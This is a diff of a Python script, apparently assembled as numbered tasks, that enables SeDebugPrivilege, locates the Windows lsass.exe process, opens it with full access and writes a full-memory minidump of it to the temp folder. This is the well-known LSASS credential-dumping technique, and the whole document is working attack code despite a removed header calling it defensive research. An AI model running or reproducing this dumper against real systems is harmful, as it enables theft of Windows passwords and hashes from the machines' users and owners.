@@ -1,34 +1,34 @@
 #!/usr/bin/env python3
-"""Merged Modules for Defensive Malware Research Framework"""
-
-import sys
-import json
-import time
-import os
+import sys, json, time, os
 from typing import Dict, Any
 import ctypes
 from ctypes import wintypes
 import psutil
 
+try:
+    import win32security
+    import win32api
+    import win32con
+except ImportError:
+    win32security = None
+
 # Constants for Windows API
 SE_DEBUG_NAME = "SeDebugPrivilege"
-PROCESS_ALL_ACCESS = 0x1F0FFF
-MINIDUMP_TYPE = 0x00000002  # MiniDumpWithFullMemory
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_QUERY = 0x0008
+SE_PRIVILEGE_ENABLED = 0x00000002
 
-# Load necessary Windows API functions
-advapi32 = ctypes.WinDLL('Advapi32.dll')
-kernel32 = ctypes.WinDLL('Kernel32.dll')
-dbghelp = ctypes.WinDLL('Dbghelp.dll')
-
-# Define necessary structures and functions
+# Structures for Windows API
 class LUID(ctypes.Structure):
-    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]
+    _fields_ = [("LowPart", wintypes.DWORD),
+                ("HighPart", wintypes.LONG)]
 
 class LUID_AND_ATTRIBUTES(ctypes.Structure):
-    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]
+    _fields_ = [("Luid", LUID),
+                ("Attributes", wintypes.DWORD)]
 
 class TOKEN_PRIVILEGES(ctypes.Structure):
-    _fields_ = [("PrivilegeCount", wintypes.DWORD), 
+    _fields_ = [("PrivilegeCount", wintypes.DWORD),
                 ("Privileges", LUID_AND_ATTRIBUTES * 1)]
 
 def enable_debug_privilege():
@@ -37,60 +37,51 @@ def enable_debug_privilege():
     luid = LUID()
     tp = TOKEN_PRIVILEGES()
     
-    # Open process token
-    if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0020 | 0x0008, ctypes.byref(hToken)):
-        return False
-
-    # Lookup privilege value
-    if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):
-        return False
-
-    # Set up privilege structure
+    # Open the process token
+    ctypes.windll.advapi32.OpenProcessToken(
+        ctypes.windll.kernel32.GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        ctypes.byref(hToken)
+    )
+    
+    # Lookup the privilege value
+    ctypes.windll.advapi32.LookupPrivilegeValueW(
+        None, SE_DEBUG_NAME, ctypes.byref(luid)
+    )
+    
+    # Set up the privilege structure
     tp.PrivilegeCount = 1
     tp.Privileges[0].Luid = luid
-    tp.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED
-
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+    
     # Adjust token privileges
-    if not advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None):
-        return False
-
-    return True
+    ctypes.windll.advapi32.AdjustTokenPrivileges(
+        hToken, False, ctypes.byref(tp), 0, None, None
+    )
+    
+    # Close the token handle
+    ctypes.windll.kernel32.CloseHandle(hToken)
 
 def dump_memory(pid: int, handle: int) -> Dict[str, Any]:
-    """Dump the memory of a process to a file."""
-    # Enable debug privilege
-    if not enable_debug_privilege():
-        return {'path': None, 'size': None}
-
-    # Open the process
-    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-    if not process_handle:
-        return {'path': None, 'size': None}
-
-    # Create dump file
+    """Create a memory dump of the specified process."""
     dump_file_path = os.path.join(os.environ['TEMP'], f"lsass_{pid}.dmp")
     with open(dump_file_path, 'wb') as dump_file:
-        # Write the dump
-        success = dbghelp.MiniDumpWriteDump(
-            process_handle,
+        # Use MiniDumpWriteDump to create the dump
+        success = ctypes.windll.Dbghelp.MiniDumpWriteDump(
+            handle,
             pid,
             dump_file.fileno(),
-            MINIDUMP_TYPE,
+            2,  # MiniDumpWithFullMemory
             None,
             None,
             None
         )
-
-    # Close the process handle
-    kernel32.CloseHandle(process_handle)
-
-    if not success:
-        return {'path': None, 'size': None}
-
+        if not success:
+            raise Exception("Failed to create memory dump")
+    
     # Get the size of the dump file
     dump_file_size = os.path.getsize(dump_file_path)
-
-    return {'path': dump_file_path, 'size': dump_file_size}
+    return {"path": dump_file_path, "size": dump_file_size}
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
@@ -101,24 +92,24 @@ def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     try:
         if win32security:
             # Check if the user is an admin
-            is_admin = bool(win32security.IsUserAnAdmin())
+            is_admin = win32api.IsUserAnAdmin()
 
-            # Try to acquire SeDebugPrivilege
-            hToken = win32security.OpenProcessToken(
-                win32api.GetCurrentProcess(),
-                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
-            )
+            # Obtain a handle to the current process token
+            process_handle = win32api.GetCurrentProcess()
+            token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
+
+            # Lookup the privilege value for SeDebugPrivilege
             privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
-            new_privileges = [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
-            win32security.AdjustTokenPrivileges(hToken, False, new_privileges)
 
-            # Verify if the privilege was successfully acquired
-            has_debug = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
-            has_debug = any(privilege_id == priv[0] and (priv[1] & win32security.SE_PRIVILEGE_ENABLED)
-                            for priv in has_debug)
+            # Enable the SeDebugPrivilege
+            privileges = [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
+            win32security.AdjustTokenPrivileges(token_handle, False, privileges)
+
+            # Check if the privilege was successfully enabled
+            has_debug = win32security.GetTokenInformation(token_handle, win32security.TokenPrivileges)
+            has_debug = any(privilege_id == priv[0] and priv[1] == win32security.SE_PRIVILEGE_ENABLED for priv in has_debug)
         else:
-            # Fallback to checking if the user is an admin
-            import ctypes
+            # Fallback: Check if the user is an admin using ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             has_debug = is_admin
 
@@ -135,68 +126,31 @@ def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     try:
         # Constants
         PROCESS_ALL_ACCESS = 0x1F0FFF
-        SE_DEBUG_NAME = "SeDebugPrivilege"
-        TOKEN_ADJUST_PRIVILEGES = 0x0020
-        TOKEN_QUERY = 0x0008
+        LSASS_PROCESS_NAME = "lsass.exe"
 
-        # Structures
-        class LUID(ctypes.Structure):
-            _fields_ = [("LowPart", wintypes.DWORD),
-                        ("HighPart", wintypes.LONG)]
-
-        class LUID_AND_ATTRIBUTES(ctypes.Structure):
-            _fields_ = [("Luid", LUID),
-                        ("Attributes", wintypes.DWORD)]
-
-        class TOKEN_PRIVILEGES(ctypes.Structure):
-            _fields_ = [("PrivilegeCount", wintypes.DWORD),
-                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]
-
-        # Functions
-        OpenProcess = ctypes.windll.kernel32.OpenProcess
-        OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
-        OpenProcess.restype = wintypes.HANDLE
-
-        OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
-        OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
-        OpenProcessToken.restype = wintypes.BOOL
-
-        LookupPrivilegeValue = ctypes.windll.advapi32.LookupPrivilegeValueW
-        LookupPrivilegeValue.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(LUID)]
-        LookupPrivilegeValue.restype = wintypes.BOOL
-
-        AdjustTokenPrivileges = ctypes.windll.advapi32.AdjustTokenPrivileges
-        AdjustTokenPrivileges.argtypes = [wintypes.HANDLE, wintypes.BOOL, ctypes.POINTER(TOKEN_PRIVILEGES), wintypes.DWORD, ctypes.POINTER(TOKEN_PRIVILEGES), ctypes.POINTER(wintypes.DWORD)]
-        AdjustTokenPrivileges.restype = wintypes.BOOL
-
-        # Adjust token privileges to enable SeDebugPrivilege
-        if input_data.get('is_admin') and input_data.get('has_debug'):
-            token_handle = wintypes.HANDLE()
-            current_process = OpenProcess(PROCESS_ALL_ACCESS, False, ctypes.windll.kernel32.GetCurrentProcessId())
-            if OpenProcessToken(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token_handle)):
-                luid = LUID()
-                if LookupPrivilegeValue(None, SE_DEBUG_NAME, ctypes.byref(luid)):
-                    tp = TOKEN_PRIVILEGES(1, LUID_AND_ATTRIBUTES(luid, 0x00000002))
-                    AdjustTokenPrivileges(token_handle, False, ctypes.byref(tp), 0, None, None)
-
-        # Find LSASS process
+        # Find the LSASS process ID
         lsass_pid = None
         for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'] == 'lsass.exe':
+            if proc.info['name'].lower() == LSASS_PROCESS_NAME:
                 lsass_pid = proc.info['pid']
                 break
 
         if lsass_pid is None:
             raise Exception("LSASS process not found")
 
-        # Open handle to LSASS
+        # Open a handle to the LSASS process
+        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        OpenProcess = kernel32.OpenProcess
+        OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+        OpenProcess.restype = wintypes.HANDLE
+
         handle = OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)
         if not handle:
             raise Exception("Failed to open handle to LSASS")
 
         result = {
-            "handle": handle,
-            "pid": lsass_pid
+            'handle': handle,
+            'pid': lsass_pid
         }
 
         return {'success': True, 'data': result,
@@ -209,9 +163,15 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        pid = input_data.get('pid')
-        handle = input_data.get('handle')
+        pid = input_data.get('pid', 0)
+        handle = input_data.get('handle', 0)
+        
+        # Enable SeDebugPrivilege
+        enable_debug_privilege()
+        
+        # Create memory dump
         result = dump_memory(pid, handle)
+        
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
